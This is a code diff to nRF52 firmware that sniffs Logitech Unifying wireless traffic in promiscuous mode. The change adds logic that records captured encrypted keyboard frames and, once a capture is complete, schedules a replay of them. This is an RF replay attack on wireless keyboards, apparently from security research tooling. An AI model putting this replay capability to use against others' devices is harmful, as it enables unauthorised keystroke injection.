@@ -84,7 +84,7 @@
 #define CHANNEL_HOP_RESTART_DELAY 1200
 
 // Scheduler settings
-#define SCHED_MAX_EVENT_DATA_SIZE   MAX(MAX(sizeof(nrf_esb_evt_t), APP_TIMER_SCHED_EVENT_DATA_SIZE), sizeof(nrf_esb_payload_t))
+#define SCHED_MAX_EVENT_DATA_SIZE   BYTES_TO_WORDS(MAX(sizeof(unifying_rf_record_set_t),MAX(MAX(sizeof(nrf_esb_evt_t), APP_TIMER_SCHED_EVENT_DATA_SIZE), sizeof(nrf_esb_payload_t))))
 //#define SCHED_MAX_EVENT_DATA_SIZE   APP_TIMER_SCHED_EVENT_DATA_SIZE
 #define SCHED_QUEUE_SIZE            32
 
@@ -419,7 +419,25 @@ void nrf_esb_process_rx() {
                     }
                 }
                 
-                unifying_frame_classify(rx_payload);
+                
+                uint8_t rfReportType;
+                bool rfReportIsKeepAlive;
+                unifying_frame_classify_log(rx_payload);
+                unifying_frame_classify(rx_payload, &rfReportType, &rfReportIsKeepAlive);
+
+                switch (rfReportType) {
+                    case UNIFYING_RF_REPORT_ENCRYPTED_KEYBOARD:
+                    {
+                        bool full_capture = unifying_record_rf_frame(rx_payload);
+                        if (full_capture) {
+                            NRF_LOG_INFO("scheduling replay");
+                            unifying_transmit_records(rx_payload.pipe);
+                        }
+                        break;
+                    }
+                    default:
+                        break;
+                }
 
                 m_channel_hop_delay_ms = CHANNEL_HOP_RESTART_DELAY; // set restart timer interval (will start channel hopping, if no data received after this timeout)
                 m_channel_hop_data_received = true; //don't restart channel hop timer
@@ -710,6 +728,7 @@ int main(void)
     nrf_esb_start_rx();
     NRF_LOG_INFO("Start listening for devices in promiscuous mode");
 
+    unifying_init();
     //ret = nrf_esb_start_rx();
     //if (ret == NRF_SUCCESS) bsp_board_led_on(BSP_BOARD_LED_3);
         
